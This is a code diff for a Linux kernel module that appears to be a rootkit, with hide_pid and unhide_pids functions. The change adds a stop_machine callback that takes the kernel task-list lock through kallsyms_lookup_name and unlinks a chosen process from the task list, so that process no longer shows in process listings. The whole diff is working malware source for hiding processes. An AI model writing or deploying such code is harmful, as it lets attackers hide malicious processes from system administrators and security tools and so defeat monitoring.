@@ -4,7 +4,7 @@
 #include <linux/proc_fs.h>
 #include <linux/sched/task.h>
 
-#include <linux/preempt.h>
+#include <linux/stop_machine.h>
 
 #include <linux/fs.h>
 #include <linux/fdtable.h>
@@ -57,6 +57,23 @@ unhide_pids(void)
     }
 }
 
+int
+del_task_cpu_stopped(void *arg)
+{
+    struct task_struct *ts = (struct task_struct *)arg;
+
+    rwlock_t *rwlock = (rwlock_t *)kallsyms_lookup_name("tasklist_lock");
+
+    if (!ts || !ts->tasks.prev || !ts->tasks.next) {
+        return 0;
+    }
+
+    write_lock_irq(rwlock);
+    list_del(&ts->tasks);
+    write_unlock_irq(rwlock);
+
+    return 0;
+}
 
 void
 hide_pid(pid_t pid)
@@ -88,20 +105,7 @@ hide_pid(pid_t pid)
     struct task_struct *ts;
 	ts = pid_task(pid_struct, PIDTYPE_PID);
 
-    rwlock_t *rwlock = (rwlock_t *)kallsyms_lookup_name("tasklist_lock");
-
-    if (!ts || !ts->tasks.prev || !ts->tasks.next) {
-        DEBUG_INFO("NULL SOMEWHERE\n");
-        return;
-    }
-
-    preempt_disable();
-    write_lock_irq(rwlock);
-    list_del(&ts->tasks)
-	/* ts->tasks.prev->next = ts->tasks.next; */
-	/* ts->tasks.next->prev = ts->tasks.prev; */
-    write_unlock_irq(rwlock);
-    preempt_enable();
+    stop_machine((cpu_stop_fn_t)del_task_cpu_stopped, (void *)ts, NULL);
 }
 
 void
